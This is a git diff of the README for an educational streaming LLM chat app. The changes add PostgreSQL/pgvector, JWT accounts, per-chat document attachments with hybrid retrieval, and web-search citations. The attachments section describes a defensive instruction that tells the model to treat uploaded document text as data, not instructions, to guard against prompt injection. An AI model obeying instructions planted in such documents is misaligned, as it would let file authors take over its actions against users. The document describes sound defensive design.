@@ -1,13 +1,13 @@
 # Streaming Chat
 
-A small but production-shaped LLM chat product, built from scratch to understand how an LLM application really works: **FastAPI + OpenAI Responses API + Server-Sent Events + SQLite + React/TypeScript**. No LangChain, no agent framework, no abstraction layer. The OpenAI SDK is used directly so every important step is visible, including the tool-calling loop that lets the model search the web and cite its sources.
+A small but production-shaped LLM chat product, built from scratch to understand how an LLM application really works: **FastAPI + OpenAI Responses API + Server-Sent Events + PostgreSQL/pgvector + JWT login + React/TypeScript**. No LangChain, no agent framework, no abstraction layer. The OpenAI SDK is used directly so every important step is visible, including the tool-calling loop that lets the model search the web, search the documents you attach to a chat, and cite its sources.
 
 ```
-User → React → HTTP POST → FastAPI → conversation history (SQLite)
+User → React → HTTP POST (+ JWT) → FastAPI → conversation history (PostgreSQL)
      → OpenAI Responses API (streaming) → deltas → FastAPI → SSE → React → tokens appear
 ```
 
-> **New here?** [`docs/`](docs/index.html) is an interactive guide to how this app works: 17 lessons covering the architecture, every generative-AI idea in it and the real code, with examples that run in your browser. Open `docs/index.html` (or see [`docs/README.md`](docs/README.md)).
+> **New here?** [`docs/`](docs/index.html) is an interactive guide to how this app works: 21 lessons covering the architecture, every generative-AI idea in it and the real code, with examples that run in your browser. Open `docs/index.html` (or see [`docs/README.md`](docs/README.md)).
 
 ## Contents
 
@@ -17,21 +17,24 @@ User → React → HTTP POST → FastAPI → conversation history (SQLite)
 4. [Tech stack](#tech-stack)
 5. [Project structure](#project-structure)
 6. [Setup](#setup)
-7. [Environment variables](#environment-variables)
-8. [Database schema](#database-schema)
-9. [API endpoints](#api-endpoints)
-10. [Streaming architecture](#streaming-architecture)
-11. [SSE explanation](#sse-explanation)
-12. [History management](#history-management)
-13. [Token accounting](#token-accounting)
-14. [Cost accounting](#cost-accounting)
-15. [Retry behavior](#retry-behavior)
-16. [Cancellation](#cancellation)
-17. [Failure handling](#failure-handling)
-18. [Testing](#testing)
-19. [Security](#security)
-20. [Production improvements](#production-improvements)
-21. [Troubleshooting](#troubleshooting)
+7. [Web search and citations](#web-search-and-citations)
+8. [Accounts and authentication](#accounts-and-authentication)
+9. [Attachments and RAG](#attachments-and-rag)
+10. [Environment variables](#environment-variables)
+11. [Database schema](#database-schema)
+12. [API endpoints](#api-endpoints)
+13. [Streaming architecture](#streaming-architecture)
+14. [SSE explanation](#sse-explanation)
+15. [History management](#history-management)
+16. [Token accounting](#token-accounting)
+17. [Cost accounting](#cost-accounting)
+18. [Retry behavior](#retry-behavior)
+19. [Cancellation](#cancellation)
+20. [Failure handling](#failure-handling)
+21. [Testing](#testing)
+22. [Security](#security)
+23. [Production improvements](#production-improvements)
+24. [Troubleshooting](#troubleshooting)
 
 ## Why this project exists
 
@@ -46,7 +49,11 @@ This project implements each of those directly.
 
 ## What it does
 
+- **Accounts and login** (email + password, JWT). Nobody can chat without signing in, and every chat, file and cost record belongs to one user
 - Multiple persistent conversations (survive page refresh and server restart)
+- **Per-chat attachments**: attach PDF, Word (.docx), text and Markdown files; the model searches them (vector + keyword search in PostgreSQL/pgvector) and cites the file and page
+- **Web search** with numbered, clickable citations (Tavily)
+- **Rolling-summary memory** for long chats, **prompt caching** and a **Usage page** (spend, cache hit rate, money saved)
 - Tokens appear live as the model generates them; **Stop** cancels generation
 - Per-message token usage, cost and time-to-first-token; per-conversation total cost
 - Token-budgeted history (long chats don't grow without bound)
@@ -60,11 +67,11 @@ This project implements each of those directly.
 ┌────────────────────────┐        ┌───────────────────────────────────────────┐        ┌────────────┐
 │ Browser (React + TS)   │        │ FastAPI (Python)                          │        │ OpenAI     │
 │                        │  POST  │                                           │        │            │
-│  Chat.tsx              │───────▶│ main.py       routes, limits              │        │ Responses  │
+│  Chat.tsx              │───────▶│ main.py       routes, limits, auth        │        │ Responses  │
 │  api.ts  fetch +       │ {text} │ streaming.py  the pipeline                │ stream │ API        │
-│   ReadableStream       │        │   1 save user msg           ┌──────────┐  │───────▶│            │
-│  sse.ts  buffer+parse  │        │   2 create assistant row    │ SQLite   │  │ =True  │            │
-│                        │◀───────│   3 build history ◀────────▶│ chat.db  │  │◀───────│ deltas     │
+│   ReadableStream       │ + JWT  │   1 save user msg           ┌──────────┐  │───────▶│            │
+│  sse.ts  buffer+parse  │        │   2 create assistant row    │ Postgres │  │ =True  │            │
+│                        │◀───────│   3 build history ◀────────▶│+ pgvector│  │◀───────│ deltas     │
 │  AbortController ──────┼─ abort─▶   4 call model (llm/)       └──────────┘  │ events │            │
 │  (Stop button)         │  SSE   │   5 delta → SSE `delta`                    │        │            │
 │                        │ events │   6 finalize row, send `done`              │        │            │
@@ -78,20 +85,23 @@ This project implements each of those directly.
 
 | Layer | File | Knows about | Does *not* know about |
 |---|---|---|---|
-| HTTP | `app/main.py` | routes, validation, limits | OpenAI |
+| HTTP | `app/main.py` | routes, validation, limits, who the caller is | OpenAI |
+| Auth | `app/auth/` | passwords, JWTs, signup/login | chats, OpenAI |
+| Retrieval | `app/rag/`, `app/tools/documents.py` | extract, chunk, embed, search documents | HTTP routing |
 | Pipeline | `app/chat/streaming.py` | DB + LLM + SSE together | HTTP routing, OpenAI SDK types |
 | Provider | `app/llm/client.py` | OpenAI SDK, retry, error mapping | the database, HTTP |
 | History | `app/chat/history.py` | messages → budgeted history | everything else (pure functions) |
 | Pricing | `app/llm/pricing.py` | tokens → dollars | everything else |
 | Wire format | `app/chat/sse.py` | SSE text format | everything else |
 
-Because `app/llm/client.py` is the *only* module that imports `openai`, the rest of the app is tested against a scripted stub and never needs the network.
+`app/llm/client.py` and `app/rag/embeddings.py` are the only modules that talk to OpenAI, so the rest of the app is tested against scripted stubs and never needs the network.
 
 ## Tech stack
 
-**Backend:** Python 3.10+, FastAPI, Uvicorn, official OpenAI Python SDK (Responses API), SQLite (stdlib `sqlite3`), Pydantic, pytest.
-**Frontend:** React 19, TypeScript, Vite, `react-markdown` (the only runtime dependency beyond React), Vitest.
-**Not used (on purpose):** LangChain, LangGraph, Anthropic, Redis, Kafka, vector DBs, auth. (The agent loop is hand-written in `app/llm/client.py`.)
+**Backend:** Python 3.10+, FastAPI, Uvicorn, official OpenAI Python SDK (Responses API + embeddings), PostgreSQL 16 with **pgvector** (psycopg 3 + pool), PyJWT, argon2-cffi, pypdf, python-docx, Pydantic, pytest.
+**Frontend:** React 19, TypeScript, Vite, `react-markdown` (+ KaTeX and syntax highlighting), Vitest.
+**Infrastructure:** Docker Compose runs the database (`pgvector/pgvector:pg16`).
+**Not used (on purpose):** LangChain, LangGraph, Redis, Kafka, a separate vector database service, an auth provider. (The agent loop, the chunker and the retrieval query are hand-written so you can read them.)
 
 ## Project structure
 
@@ -99,10 +109,16 @@ Because `app/llm/client.py` is the *only* module that imports `openai`, the rest
 Streaming-Chat-App/
 ├── AI/                           the Python service
 │   ├── app/
-│   │   ├── main.py           create_app(): routes, CORS, body-size cap, rate limit, 409 guard
+│   │   ├── main.py           create_app(): routes, auth dependency, CORS, body-size caps, rate limits, 409 guard
 │   │   ├── config.py         Settings from env; fails fast with actionable messages
 │   │   ├── schemas.py        Pydantic request/response models
-│   │   ├── db.py             SQLite schema + data access
+│   │   ├── db.py             PostgreSQL access: users, chats, messages, documents, chunks, hybrid search
+│   │   ├── migrations.py     the migration runner (numbered .sql files, advisory lock, one transaction)
+│   │   ├── cli.py            admin commands: create-user, claim-legacy, import-sqlite
+│   │   ├── auth/
+│   │   │   ├── passwords.py  argon2id hashing + verification
+│   │   │   ├── tokens.py     create/verify JWTs (HS256, exp + sub required, algorithms pinned)
+│   │   │   └── routes.py     /auth/signup, /auth/login, /auth/me + current_user dependency
 │   │   ├── chat/
 │   │   │   ├── streaming.py  begin_turn() + stream_reply(): THE pipeline
 │   │   │   ├── history.py    approx_tokens(), build_history() (budgeted, summary-aware)
@@ -110,46 +126,58 @@ Streaming-Chat-App/
 │   │   │   ├── usage_report.py  build_usage_report(): the numbers behind the Usage page
 │   │   │   └── sse.py        sse(event, data) wire formatter
 │   │   ├── llm/
-│   │   │   ├── client.py     OpenAI Responses API: stream(), retry, error mapping, titles
+│   │   │   ├── client.py     OpenAI Responses API: stream(), agent loop, retry, error mapping, titles
 │   │   │   ├── usage.py      parse_usage(): provider-reported token usage
 │   │   │   ├── pricing.py    PriceTable, cost = tokens × price / 1M (None if unpriced)
-│   │   │   └── accounting.py usage columns + recording title/summary call costs
+│   │   │   └── accounting.py usage columns + recording title/summary/embedding call costs
+│   │   ├── rag/
+│   │   │   ├── extract.py    safe text extraction: PDF, DOCX, text, Markdown (allowlist, magic bytes, zip-bomb guard)
+│   │   │   ├── chunker.py    paragraph-aware chunks with overlap, page and heading metadata
+│   │   │   ├── embeddings.py OpenAIEmbedder: batching, retries, usage (text-embedding-3-small)
+│   │   │   └── ingest.py     DocumentManager: background indexing, status processing → ready/failed
 │   │   ├── tools/
 │   │   │   ├── web_search.py  Tavily search -> numbered sources (safe errors, http(s) URLs only)
-│   │   │   └── registry.py    web_search tool definition + per-reply ToolRunner (citation numbering)
+│   │   │   ├── documents.py   DocumentSearch: embed the query, hybrid-search ONE user's ONE chat
+│   │   │   └── registry.py    tool definitions + per-reply ToolRunner (one [n] numbering for web and documents)
 │   │   └── core/
-│   │       ├── limits.py     BodySizeLimitMiddleware, SlidingWindowLimiter
+│   │       ├── limits.py     BodySizeLimitMiddleware (per-route caps), SlidingWindowLimiter
 │   │       └── fx.py         USD→INR display rate
-│   ├── data/
-│   │   ├── prices.toml       model prices YOU fill in (no invented prices)
-│   │   └── chat.db           SQLite database (git-ignored, created on first run)
-│   ├── tests/                170+ tests
+│   ├── migrations/
+│   │   ├── 001_initial.sql   conversations, messages, usage ledgers
+│   │   ├── 002_users.sql     accounts; every chat and cost row gets an owner
+│   │   └── 003_documents.sql documents, chunks (pgvector + full-text indexes)
+│   ├── data/prices.toml      model prices YOU fill in (no invented prices)
+│   ├── tests/                440+ tests (real PostgreSQL per test, scripted LLM, fake embedder)
 │   ├── requirements.txt
 │   └── pytest.ini
 ├── frontend/src/
-│   ├── api.ts            fetch + stream reader (POST + SSE)
+│   ├── api.ts            fetch + bearer token + stream reader (POST + SSE) + uploads
+│   ├── auth.ts · AuthContext.tsx · Login.tsx   token storage, session state, sign in / sign up screen
 │   ├── sse.ts            incremental SSE parser (buffering) + sse.test.ts
-│   ├── Chat.tsx          conversation state machine, Stop/AbortController
-│   ├── Message.tsx       plain text while streaming → sanitized Markdown after
+│   ├── Chat.tsx          conversation state machine, Stop/AbortController, attachments (attach, drop, status polling)
+│   ├── documents.ts      pure helpers for attachments (file checks, list updates) + tests
+│   ├── Message.tsx       plain text while streaming → sanitized Markdown after; citations and source cards
 │   ├── Usage.tsx         the Usage page: spend, tokens, cache hit rate, savings (hand-drawn SVG/CSS charts)
 │   ├── chart.ts          pure chart helpers (nice axis, ticks, labels) + chart.test.ts
 │   ├── App.tsx           sidebar, URL-hash routing
 │   └── styles.css
-├── run.sh                launcher: backend + frontend
+├── docker-compose.yml    PostgreSQL + pgvector (127.0.0.1:5440)
+├── docs/                 the interactive guide (open docs/index.html)
+├── run.sh                launcher: database + backend + frontend
 ├── .env.example · .gitignore · README.md
 ```
 
 ## Setup
 
-Requirements: Python 3.10+, Node 20+.
+Requirements: Python 3.10+, Node 20+, Docker (the database runs in a container).
 
-**Fastest way:** create `.env` (`cp .env.example .env`, set `OPENAI_API_KEY` and `OPENAI_MODEL`), then
+**Fastest way:** create `.env` (`cp .env.example .env`, set `OPENAI_API_KEY`, `OPENAI_MODEL` and `JWT_SECRET`; generate the secret with `python -c "import secrets; print(secrets.token_urlsafe(48))"`), then
 
 ```bash
 ./run.sh           # OpenAI from .env (each chat message costs money)
 ```
 
-It creates the venv / installs `node_modules` on first run, validates your config before starting (clear error if the key or model is missing, a note if the model has no price in `prices.toml`), starts the backend (`--reload`) and frontend, and **Ctrl+C stops both**. Starting the app makes no OpenAI request; only sending a message does. Backend: http://localhost:8501, frontend: http://localhost:3100 (Vite prints the actual URL and moves to the next port if 3100 is busy). Options: `--backend-port N`, `--frontend-port N`.
+It starts PostgreSQL (`docker compose up -d postgres`, waits until it is healthy), creates the venv / installs `node_modules` on first run, validates your config before starting (clear error if the key or model is missing, a note if the model has no price in `prices.toml`), starts the backend (`--reload`) and frontend, and **Ctrl+C stops both**. Starting the app makes no OpenAI request; only sending a message does. Backend: http://localhost:8501, frontend: http://localhost:3100 (Vite prints the actual URL and moves to the next port if 3100 is busy). Options: `--backend-port N`, `--frontend-port N`.
 
 Manual setup, step by step:
 
@@ -160,12 +188,15 @@ python3 -m venv .venv && source .venv/bin/activate
 pip install -r requirements.txt
 
 # 2. Configuration (repo root)
-cp ../.env.example ../.env       # then edit .env
+cp ../.env.example ../.env       # then edit .env (OPENAI_API_KEY, OPENAI_MODEL, JWT_SECRET)
 
-# 3. Run the API  (http://localhost:8501, interactive docs at /docs)
-python -m uvicorn app:app --reload --port 8501
+# 3. Database (repo root): PostgreSQL + pgvector in a container; migrations run when the API starts
+docker compose up -d postgres
 
-# 4. Frontend (new terminal)
+# 4. Run the API  (http://localhost:8501, interactive docs at /docs)
+python -m uvicorn app.main:app --reload --port 8501
+
+# 5. Frontend (new terminal)
 cd frontend
 npm install
 VITE_API_URL=http://localhost:8501 npm run dev -- --port 3100
@@ -175,7 +206,11 @@ VITE_API_URL=http://localhost:8501 npm run dev -- --port 3100
 
 1. In `.env`: `OPENAI_API_KEY=...`, `OPENAI_MODEL=<a model id your account can use>`.
 2. Add that model to `AI/data/prices.toml` (current price from OpenAI's pricing page) or costs will show as "cost n/a".
-3. Without a valid key/model the server **refuses to start** and says what to change.
+3. Without a valid key/model (or a `JWT_SECRET` of at least 32 characters) the server **refuses to start** and says what to change.
+
+### First run and old data
+
+Open the app and **create an account** on the sign-up tab; you are signed in for `JWT_EXPIRES_DAYS` (7). If you used an earlier, login-less version with a SQLite file, bring its chats over with `cd AI && python -m app.cli import-sqlite data/chat.db you@example.com`. Other admin commands: `create-user` (when `SIGNUP_ENABLED=false`) and `claim-legacy` (give data that pre-dates accounts to a real account).
 
 ## Web search and citations
 
@@ -197,6 +232,54 @@ Browser ── message ──▶ FastAPI ──▶ OpenAI (tools: web_search)
 - Citation numbers belong to one reply. The system prompt tells the model never to reuse markers from earlier messages.
 - Search cost is counted (`web_searches` per reply), not priced.
 
+## Accounts and authentication
+
+Login is required: every route except `GET /health` and `POST /auth/signup|login` answers `401` without a valid token, and a test walks the app's real route table to make sure a route added later cannot forget it.
+
+```
+sign up / log in ──▶ POST /auth/login {email, password}
+                       │  argon2id verify (a full check even for an unknown email, so timing does not reveal accounts)
+                       ▼
+                  { token: <JWT, 7 days>, user }  ──▶ browser keeps it in localStorage
+every request ──▶ Authorization: Bearer <JWT> ──▶ verify signature + expiry ──▶ current_user ──▶ queries filtered by user_id
+```
+
+- **Passwords** are stored as argon2id hashes (never the password), re-hashed on login if the hashing settings were strengthened. Minimum length `PASSWORD_MIN_LENGTH`.
+- **The JWT** is HS256-signed with `JWT_SECRET`, carries `sub` (user id) and `exp`, and the verifier pins the algorithm list, so a token with `alg: none` or a different algorithm is rejected. Anyone who knows the secret can forge a login for any user: keep it private and long.
+- **Isolation.** Every conversation, document, chunk and cost row has an owner, and every query filters on it. Someone else's chat id answers `404`, not `403`, so ids cannot be used to discover what other accounts have. Retrieval filters on `user_id` *and* `conversation_id` inside the SQL itself.
+- **Abuse limits.** Login/signup attempts per IP (`AUTH_RATE_LIMIT_PER_MINUTE`), chat requests and uploads per *user*, generic "Incorrect email or password" errors.
+- **In the browser** the token lives in `localStorage` (like a typical MERN app). Trade-off: a cross-site-scripting bug could read it, which is why LLM output is rendered through a sanitising Markdown pipeline. An `httpOnly` cookie is the stricter alternative (see *Production improvements*). Any `401` makes the app sign you out and show the login screen.
+- **Pre-login data** is moved to a real account with `python -m app.cli claim-legacy EMAIL`.
+
+## Attachments and RAG
+
+RAG (retrieval-augmented generation) means: instead of pasting a whole document into the prompt, find the few passages that answer the question and give only those to the model.
+
+```
+upload ──▶ POST /conversations/{id}/documents (202, status "processing")
+             │ background task (DocumentManager)
+             ├─ extract text      PDF (per page) · DOCX (headings, tables) · .txt · .md
+             ├─ chunk             ~1800 chars, 200 overlap, whole paragraphs, page + heading kept
+             ├─ embed             text-embedding-3-small: each chunk → 1536 numbers (its meaning)
+             └─ store             chunks + vectors in ONE transaction → status "ready"
+
+question ──▶ model decides to call search_documents("how long do refunds take")
+             ├─ embed the query (same model)
+             ├─ vector search   HNSW index, cosine distance        ─┐ each takes its top candidates
+             ├─ keyword search  tsvector + GIN, websearch_to_tsquery ─┘
+             ├─ merge with Reciprocal Rank Fusion: score = 1/(60+rank) from each list
+             └─ top RAG_TOP_K passages ──▶ model ──▶ answer with [1] [2] citations (file + page)
+```
+
+- **Why hybrid.** Vector search finds passages with the same *meaning* ("cancel my plan" ≈ "terminate your subscription") but can miss exact names and codes; keyword search is the opposite. A passage that both like beats one that only one likes, and RRF needs no tuning because it uses ranks, not raw scores.
+- **Scoped in SQL.** `chunks` carries `user_id` and `conversation_id`, and every search filters on both. A document attached to one chat is invisible to every other chat and every other user (tested with a second account).
+- **Safe reading of files.** Extension allowlist, magic-byte check (a program renamed `.pdf` is refused), size cap before the body is read, a limit on pages, characters and chunks, and a zip-bomb guard for `.docx`. Old `.doc`, scanned PDFs without text and password-protected PDFs get a plain explanation.
+- **A tool, not always-on context.** The `search_documents` tool is offered only when the chat has a *ready* file; the model decides when to call it. The instructions tell it that document text is **data, not instructions**, which is the first defence against prompt injection from an uploaded file.
+- **Citations.** Web results and document passages share one `[n]` numbering per reply. A document source shows the file, the page and (on click) the passage itself.
+- **Cost.** Embedding calls are recorded as their own purpose (`embedding`) and appear on the Usage page; the price entry for the embedding model is in `AI/data/prices.toml`.
+- **Failure handling.** A file that cannot be read, an embedding outage, or a document deleted while it was being indexed all end in a defined state (`failed` with a short safe reason, or a quiet no-op); a server killed mid-indexing marks those files `failed` at the next start.
+- **Limits** (`.env`): `MAX_UPLOAD_MB`, `MAX_DOCUMENTS_PER_CHAT`, `UPLOAD_RATE_LIMIT_PER_MINUTE`, `RAG_*`.
+
 ## Environment variables
 
 See [.env.example](.env.example) for the annotated file.
@@ -213,12 +296,22 @@ See [.env.example](.env.example) for the annotated file.
 | `HISTORY_BUDGET_TOKENS` | `6000` | budget for past messages (not the context window) |
 | `MEMORY_SUMMARY_ENABLED` | `true` | fold old messages into a rolling summary instead of dropping them |
 | `OPENAI_SUMMARY_MODEL` | title model | model that writes the summaries |
+| `OPENAI_EMBEDDING_MODEL` | `text-embedding-3-small` | embeds document passages and questions; must give 1536 dimensions |
+| `JWT_SECRET` | – | **required**, 32+ characters; signs login tokens (keep private) |
+| `JWT_EXPIRES_DAYS` | `7` | how long a login lasts |
+| `PASSWORD_MIN_LENGTH` | `8` | |
+| `SIGNUP_ENABLED` | `true` | `false` = accounts only via `python -m app.cli create-user` |
+| `AUTH_RATE_LIMIT_PER_MINUTE` | `10` | login/signup attempts per IP |
+| `MAX_UPLOAD_MB` · `MAX_DOCUMENTS_PER_CHAT` | `10` · `10` | attachment limits |
+| `UPLOAD_RATE_LIMIT_PER_MINUTE` | `20` | uploads per user |
+| `RAG_MAX_PAGES` · `RAG_CHUNK_CHARS` · `RAG_OVERLAP_CHARS` · `RAG_TOP_K` | `300` · `1800` · `200` · `6` | indexing and retrieval |
 | `MAX_MESSAGE_CHARS` | `8000` | max user message size (413 above) |
-| `RATE_LIMIT_PER_MINUTE` | `20` | per-IP chat requests; `0` disables |
+| `RATE_LIMIT_PER_MINUTE` | `20` | chat requests per **user**; `0` disables |
 | `LLM_MAX_ATTEMPTS` | `2` | total attempts per reply (1 = no retry) |
 | `RETRY_BASE_DELAY_S` | `0.5` | backoff base |
-| `PARTIAL_FLUSH_INTERVAL_S` | `1.0` | checkpoint partial text to SQLite this often |
-| `DATABASE_PATH` · `PRICES_PATH` | `data/chat.db` · `data/prices.toml` | relative to `AI/` |
+| `PARTIAL_FLUSH_INTERVAL_S` | `1.0` | checkpoint partial text to the database this often |
+| `DATABASE_URL` · `DB_POOL_MAX` | `postgresql://streambot:streambot@localhost:5440/streambot` · `10` | PostgreSQL connection and pool size |
+| `PRICES_PATH` | `data/prices.toml` | relative to `AI/` |
 | `CORS_ORIGINS` | (empty) | empty = any `localhost` port (dev); set exact origins in prod |
 | `USD_TO_INR` | `auto` | `auto` = live USD→INR rate (cached 6 h), a number = fixed rate, `0` = hide INR |
 | `USD_TO_INR_FALLBACK` | `96` | rate used only if the live lookup never succeeded |
@@ -226,32 +319,55 @@ See [.env.example](.env.example) for the annotated file.
 
 ## Database schema
 
+PostgreSQL 16 with the `pgvector` extension. The schema is built by **versioned migrations** (`AI/migrations/NNN_name.sql`), applied in order at startup by `app/migrations.py` and recorded in `schema_migrations`. A migration is never edited after it ships; a change is a new file. The runner takes an advisory lock (two servers starting together cannot race) and applies each file in one transaction (a failure leaves nothing half-done).
+
 ```sql
-conversations(id PK, title, created_at, updated_at)
+users(id PK, email UNIQUE CHECK (email = lower(email)), password_hash, created_at)        -- 002
+
+conversations(id PK, user_id → users ON DELETE CASCADE, title, created_at, updated_at,
+              summary, summary_through_id)                                                -- 001 + 002
 
 messages(
-  id PK,
+  id PK,  seq IDENTITY,                          -- seq = insertion order (same-millisecond rows still sort)
   conversation_id  → conversations(id) ON DELETE CASCADE,
   role             'user' | 'assistant',
   content          TEXT,
   status           'streaming' | 'complete' | 'cancelled' | 'error',
-  input_tokens, cached_input_tokens,           -- NULL = unavailable (never estimated)
+  input_tokens, cached_input_tokens,             -- NULL = unavailable (never estimated)
   output_tokens, reasoning_tokens, total_tokens,
-  cost_usd,                                    -- NULL = no price configured (not 0)
-  stop_reason,                                 -- completed | max_output_tokens | content_filter | cancelled | error | interrupted
+  cost_usd,                                      -- NULL = no price configured (not 0)
+  stop_reason,                                   -- completed | max_output_tokens | content_filter | cancelled | error | interrupted
   model (requested), served_model (reported by OpenAI),
-  ttft_ms, latency_ms,                         -- extras: measured facts about the reply
-  created_at)
+  ttft_ms, latency_ms, sources (JSON), web_searches,
+  created_at TIMESTAMPTZ)
 
-idx_messages_conversation (conversation_id, created_at)   -- load a chat
-idx_conversations_updated (updated_at DESC)               -- sidebar order
-idx_messages_streaming    (status) WHERE status='streaming'  -- partial index: crash recovery
+llm_calls(id, user_id, conversation_id, purpose 'title'|'summary'|'embedding', usage, cost_usd, ...)   -- background spend; no FK, outlives the chat
+archived_replies(...)                            -- usage numbers of replies in deleted chats (never the text)
+
+documents(id PK, user_id → users, conversation_id → conversations,       -- both ON DELETE CASCADE      -- 003
+          filename, kind 'pdf'|'docx'|'text'|'markdown', size_bytes,
+          status 'processing'|'ready'|'failed', error, page_count, chunk_count, created_at)
+
+chunks(id IDENTITY PK, document_id → documents ON DELETE CASCADE,
+       user_id, conversation_id,                 -- copied on purpose: every search filters on them directly
+       ordinal, page, heading, content, tokens,
+       embedding vector(1536),                   -- the passage's meaning (text-embedding-3-small)
+       tsv tsvector GENERATED ALWAYS AS (to_tsvector('english', content)) STORED)
+
+idx_messages_conversation (conversation_id, seq)             -- load a chat
+idx_conversations_user_updated (user_id, updated_at DESC)    -- the sidebar
+idx_messages_streaming (status) WHERE status='streaming'     -- partial index: crash recovery
+idx_chunks_embedding  HNSW (embedding vector_cosine_ops)     -- nearest-neighbour search
+idx_chunks_tsv        GIN  (tsv)                             -- keyword search
+idx_chunks_scope      (conversation_id, user_id)             -- every search starts here
 ```
 
-- **Why two tables?** A conversation has one title and owns many messages; merging them would repeat the title on every row and make "list my chats" scan all messages.
-- **Why a foreign key?** The database itself refuses an orphan message and cascades deletes. Integrity is enforced in one place (note: SQLite needs `PRAGMA foreign_keys=ON` per connection; `db.connect()` does it).
+- **Why PostgreSQL and not SQLite?** Many users write at once, it enforces constraints and cascades on the server, it has real migrations, and with `pgvector` it stores and searches embeddings next to the rest of the data: one system to back up, one transaction around "mark ready + insert chunks", and the retrieval query can filter on `user_id` in the same statement. (Connections come from a pool; the driver is synchronous on purpose, so the `finally` block that saves a cancelled reply contains no `await`.)
+- **Why two tables for chats?** A conversation has one title and owns many messages; merging them would repeat the title on every row and make "list my chats" scan all messages.
+- **Why foreign keys with cascades?** The database itself refuses an orphan message and removes a chat's messages, documents and chunks when the chat is deleted. Integrity is enforced in one place.
 - **Why tokens live on the assistant message?** Tokens are consumed by one model call, which produces exactly one assistant message. Per-message cost is a column; per-conversation cost is a `SUM`.
 - **Why `status`?** A reply is a process, not an instant. Without it you can't tell a finished answer from one that died halfway.
+- **Tests use real PostgreSQL**: each test gets its own database cloned from a migrated template (`docker compose up -d postgres` first), so constraints, cascades and the search query are tested against the real engine.
 
 ### Assistant message lifecycle
 
@@ -282,16 +398,22 @@ A row never leaves `complete`/`error`/`cancelled`. History building skips `error
 
 | Method & path | Purpose |
 |---|---|
-| `GET /health` | `{"status":"ok"}` |
+| `GET /health` | `{"status":"ok"}` (open) |
+| `POST /auth/signup` · `POST /auth/login` | body `{email, password}` → `{token, user}` (open; rate limited) |
+| `GET /auth/me` | the signed-in user |
 | `POST /conversations` | create → `201 {id,title,created_at,updated_at}` |
-| `GET /conversations` | list, most recently active first |
+| `GET /conversations` | **your** chats, most recently active first |
 | `GET /conversations/{id}` | `{id,title,messages:[…],total_cost_usd,total_tokens,unpriced_messages}` |
-| `POST /conversations/{id}/messages` | body `{"text":"…"}` → **SSE stream** (what the UI uses) |
-| `POST /conversations/{id}/messages/sync` | same, **non-streaming** JSON (teaching baseline; try it with `curl`) |
-| `GET /info` | `{model, usd_to_inr, usd_to_inr_source, usd_to_inr_as_of, web_search_available}` |
+| `DELETE /conversations/{id}` | delete a chat with its messages, documents and chunks (its spend stays in the Usage totals) |
+| `POST /conversations/{id}/documents` | multipart `file` → `202 {id,filename,status:"processing",…}`; indexing continues in the background |
+| `GET /conversations/{id}/documents` | the chat's files with `status` (`processing` · `ready` · `failed` + `error`) |
+| `DELETE /conversations/{id}/documents/{doc}` | remove a file and its chunks |
+| `POST /conversations/{id}/messages` | body `{"text":"…","web_search":true}` → **SSE stream** (what the UI uses) |
+| `POST /conversations/{id}/messages/sync` | same, **non-streaming** JSON, no tools (teaching baseline; try it with `curl`) |
+| `GET /info` | `{model, usd_to_inr, usd_to_inr_source, usd_to_inr_as_of, web_search_available, attachments_available}` |
 | `GET /usage?days=30&utc_offset_minutes=330` | spend, tokens, cache hit rate and savings, daily series, by purpose / model, top chats (days follow the caller's clock) |
 
-Errors before streaming starts are plain HTTP: `404` unknown conversation · `422` empty text · `413` too large · `409` a reply is already streaming in this conversation · `429` rate limited (with `Retry-After`).
+Every route except the three open ones needs `Authorization: Bearer <token>` (`401` otherwise). Errors before streaming starts are plain HTTP: `404` unknown conversation (or someone else's) · `422` empty text · `413` too large · `409` a reply is already streaming in this conversation (or too many documents) · `415` unsupported or disguised file · `429` rate limited (with `Retry-After`).
 
 ## Streaming architecture
 
@@ -350,8 +472,8 @@ data: {"text": "Hello"}
 | `delta` | `{text}` | append text immediately |
 | `done` | `stop_reason, usage{input,cached_input,output,reasoning,total}, cost{input_cost,cached_input_cost,output_cost,total_cost,cache_savings}, requested_model, served_model, ttft_ms, latency_ms, web_searches, conversation_total_*` (usage/cost are `null` when unavailable) | stop loading/Stop button, show tokens + cost, render Markdown |
 | `error` | `{message, partial}` | keep partial text, show safe message |
-| `tool_call` | `{id, name, query}` | show "Searching the web for …" (the model asked for a search) |
-| `tool_result` | `{id, name, sources:[{n,title,url,snippet}], error}` | mark the search done; remember the sources for `[n]` citations |
+| `tool_call` | `{id, name, query}` | show "Searching the web / your documents for …" (the model asked for a search) |
+| `tool_result` | `{id, name, sources:[{n,title,url,snippet,kind,page,document_id}], error}` | mark the search done; remember the sources for `[n]` citations (`kind` is `web` or `document`) |
 | `title` | `{title}` | update sidebar |
 
 ### Why `fetch()` and not `EventSource`
@@ -384,7 +506,7 @@ Streaming text is rendered as **plain text**; Markdown is rendered once, after `
 
 ## History management
 
-LLMs are **stateless**: every request must contain the conversation the model should know about. Each turn, `begin_turn` rebuilds history **from SQLite** (never from what the browser says), then `build_history` (`app/chat/history.py`):
+LLMs are **stateless**: every request must contain the conversation the model should know about. Each turn, `begin_turn` rebuilds history **from the database** (never from what the browser says), then `build_history` (`app/chat/history.py`):
 
 1. drop `error`, still-`streaming` and empty/whitespace messages (keep `complete` and `cancelled`)
 2. walk **newest → oldest**, adding messages while `used + cost ≤ HISTORY_BUDGET_TOKENS`; stop at the first that doesn't fit
@@ -464,7 +586,7 @@ static instructions → static tool definitions → rolling summary → append-o
 
 ## Usage page
 
-`#/usage` (sidebar link) shows the last 7 / 30 / 90 days: total spend (USD with INR), tokens, cache hit rate, money saved by caching, web searches, a daily-spend chart, spend by purpose (replies / chat titles / memory summaries), spend by model and the most expensive chats. Everything comes from stored rows: replies carry their own usage and cost, and title/summary calls are in `llm_calls`. A call with no configured price is counted as *unpriced* and the total is flagged as a lower bound, never counted as $0. Days follow the browser's clock (it sends its UTC offset). Deleting a chat removes its content but **not its cost**: each reply's usage numbers (tokens, cost, searches, original date; never the text) are copied to `archived_replies` in the same transaction, so spend history stays true. A deleted chat just can't appear in "most expensive chats", since there is nothing left to link to.
